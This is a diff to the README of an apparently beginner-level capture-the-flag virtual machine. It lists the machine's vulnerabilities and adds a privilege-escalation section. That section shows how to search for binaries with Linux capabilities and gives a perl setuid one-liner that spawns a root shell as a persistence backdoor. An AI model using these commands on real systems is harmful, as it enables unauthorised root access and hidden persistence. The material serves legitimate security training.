@@ -1,7 +1,5 @@
 # Pokemon_CTF
-A beginer level CTF.
-<br/>
-[_MACHINE LINK_](https://drive.google.com/file/d/1bZNuZXk_sBt9kNg0uuFez4Xti6Grf9tr/view?usp=sharing)
+#### A beginer level CTF.
 
 ## About The Machine
 
@@ -27,3 +25,33 @@ File upload vulnerability allows us to upload any type of file (even the malicio
 ### > Internal Portal Publicly accessible
 #### Severity: Medium
 The internal web portal is publicly accessible and may result in sensitive data exposure. These portals must be accessible only on the local network.
+
+### Privilege Escalation using Linux Capabilities (Binaries Capabilities)
+#### Severtiy: Critical
+Binaries can have capabilities that can be used while executing. For example, it's very common to find ping binary with cap_net_raw capability:
+```bash
+getcap /usr/bin/ping
+/usr/bin/ping = cap_net_raw+ep
+```
+You can search binaries with capabilities using:
+```bash
+getcap -r / 2>/dev/null
+```
+If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
+```bash
+cp $(which perl) .
+sudo setcap cap_setuid+ep perl
+
+./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
+
+<br/>
+[_Find the machine here_](https://drive.google.com/file/d/1bZNuZXk_sBt9kNg0uuFez4Xti6Grf9tr/view?usp=sharing)
+
+## Steps to setup the machine
+#### Step-1
+Download the machine by clicking [_here_](https://drive.google.com/file/d/1bZNuZXk_sBt9kNg0uuFez4Xti6Grf9tr/view?usp=sharing).
+#### Step-2 
+Export the .ova file to your virtual box and get started!! 
+
+## Happy Hacking! :)
